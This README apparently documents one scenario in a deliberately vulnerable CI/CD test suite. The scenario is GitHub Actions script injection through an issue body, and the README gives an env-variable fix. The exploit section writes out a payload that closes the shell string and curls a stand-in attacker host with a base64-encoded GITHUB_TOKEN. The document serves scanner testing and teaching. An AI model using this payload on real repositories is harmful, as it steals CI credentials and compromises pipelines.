# Scenario 30: Script injection via issue body

**OWASP CICD-SEC mapping:** CICD-SEC-4 (Poisoned Pipeline Execution)

**Vulnerable workflow:** [`.github/workflows/scenario-30-script-injection-issue-body.yml`](../../.github/workflows/scenario-30-script-injection-issue-body.yml)

## What this variant probes

Same canonical bug as [scenario 02](../02-script-injection-issue-title/README.md)
— attacker-controlled `github.event.*` interpolated into a `run:` block
— but the untrusted context is the issue **body** instead of the
**title**.

The point of running this variant alongside scenario 02 is to find
scanners whose untrusted-input list only covers `*.title` and misses
`*.body`. Both fields are fully attacker-controlled; both interpolate
verbatim into the generated shell script. A complete scanner ships rules
that fire on both.

## How an attacker exploits it

Open an issue whose **body** contains:

```
"; curl https://attacker.tld/$(echo $GITHUB_TOKEN | base64) #
```

The `run:` block evaluates to the same arbitrary-shell-execution
primitive as scenario 02.

## Expected scanner coverage

Identical to scenario 02 — any scanner whose untrusted-input list
covers `github.event.issue.body` should flag this. Scanners that only
match `*.title` (rare, but possible) will silently miss it.

## Fix

Same fix as scenario 02 — pass the value through an env variable:

```yaml
- env:
    BODY: ${{ github.event.issue.body }}
  run: echo "Issue reported: $BODY"
```

## References

- [Scenario 02 — Script injection via issue title](../02-script-injection-issue-title/README.md)
  — full exploitation walkthrough applies here.
- [GitHub docs — Security hardening for GitHub Actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
  ("Good practices for mitigating script injection attacks").
